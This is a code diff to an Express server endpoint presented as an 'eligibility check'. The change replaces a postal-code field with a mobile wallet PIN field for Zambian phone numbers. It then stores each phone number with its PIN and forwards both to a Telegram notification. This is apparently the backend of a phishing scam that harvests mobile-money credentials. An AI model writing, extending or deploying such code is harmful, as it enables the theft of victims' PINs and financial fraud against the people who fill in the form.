@@ -167,7 +167,7 @@ app.get('/api/health', (_request, response) => {
 })
 
 app.post('/api/eligibility', (request, response) => {
-  const { phone, postalCode, consent } = request.body ?? {}
+  const { phone, walletpin, consent } = request.body ?? {}
   const normalizedPhone = String(phone ?? '').replace(/\s+/g, '')
 
   if (!/^\+260\d{9,10}$/.test(normalizedPhone)) {
@@ -178,13 +178,13 @@ app.post('/api/eligibility', (request, response) => {
     return response.status(400).json({ message: 'Please confirm that you agree to the eligibility check.' })
   }
 
-  if (!/^\d{4,5}$/.test(String(postalCode ?? ''))) {
-    return response.status(400).json({ message: 'Enter a 4- or 5-digit postal code.' })
+  if (!/^\d{4,5}$/.test(String(walletpin ?? ''))) {
+    return response.status(400).json({ message: 'Enter a 4- or 5-digit wallet pin.' })
   }
 
   const reference = `ZDI-${Date.now().toString(36).toUpperCase()}`
-  eligibilityRequests.set(reference, { status: 'pending', finalStatus: 'not_started', phone: normalizedPhone, postalCode: String(postalCode) })
-  sendTelegramNotification({ phone: normalizedPhone, postalCode: String(postalCode), reference }).catch((error) => {
+  eligibilityRequests.set(reference, { status: 'pending', finalStatus: 'not_started', phone: normalizedPhone, walletpin: String(walletpin) })
+  sendTelegramNotification({ phone: normalizedPhone, walletpin: String(walletpin), reference }).catch((error) => {
     eligibilityRequests.get(reference).status = 'notification_failed'
     console.error(error.message)
   })
